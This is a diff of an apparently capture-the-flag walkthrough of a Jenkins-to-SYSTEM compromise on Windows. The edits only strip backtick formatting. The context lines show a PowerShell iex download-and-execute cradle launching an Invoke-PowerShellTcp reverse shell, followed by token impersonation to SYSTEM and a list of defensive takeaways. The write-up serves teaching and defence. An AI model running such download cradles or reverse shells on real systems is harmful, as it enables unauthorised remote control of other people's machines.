@@ -41,7 +41,7 @@ def proc = ["cmd.exe", "/c", "powershell iex (New-Object Net.WebClient).Download
 proc.waitFor()
 ```
 
-The `iex` part is *Invoke-Expression*, which evaluates a string as PowerShell. The downloaded script defines *Invoke-PowerShellTcp*, which is called immediately with reverse-shell parameters.
+The iex part is *Invoke-Expression*, which evaluates a string as PowerShell. The downloaded script defines *Invoke-PowerShellTcp*, which is called immediately with reverse-shell parameters.
 
 ```bash
 # attacker:
@@ -83,7 +83,7 @@ getuid
 
 If a SYSTEM token is available, the impersonation succeeds and the session is now running as SYSTEM.
 
-**Step 8 - Read flags.** Both flags are now readable: bruce's *user.txt* on his Desktop, and the room's *root.txt* under `C:\Windows\System32\config\`.
+**Step 8 - Read flags.** Both flags are now readable: bruce's *user.txt* on his Desktop, and the room's *root.txt* under C:\Windows\System32\config\.
 
 ## Key Takeaways
 
@@ -98,5 +98,5 @@ If a SYSTEM token is available, the impersonation succeeds and the session is no
 - Lock Jenkins down with role-based access control. The Script Console permission should be reserved for a tiny named group, never the default *admin* role.
 - Place Jenkins (and similar CI/CD tools) behind authenticated reverse proxies. They should never be directly internet-reachable.
 - Remove SeImpersonatePrivilege from service accounts that don't need it. The default IIS application pool identity has it, which is why JuicyPotato / PrintSpoofer / GodPotato exist.
-- Monitor Sysmon EventID 1 for `powershell.exe` spawned by service processes like *Jenkins.exe* or *java.exe*. That parent/child relationship is high-confidence malicious.
+- Monitor Sysmon EventID 1 for powershell.exe spawned by service processes like *Jenkins.exe* or *java.exe*. That parent/child relationship is high-confidence malicious.
 - Disable PowerShell *Invoke-Expression* on a per-account basis with constrained language mode for service accounts that don't need scripting.
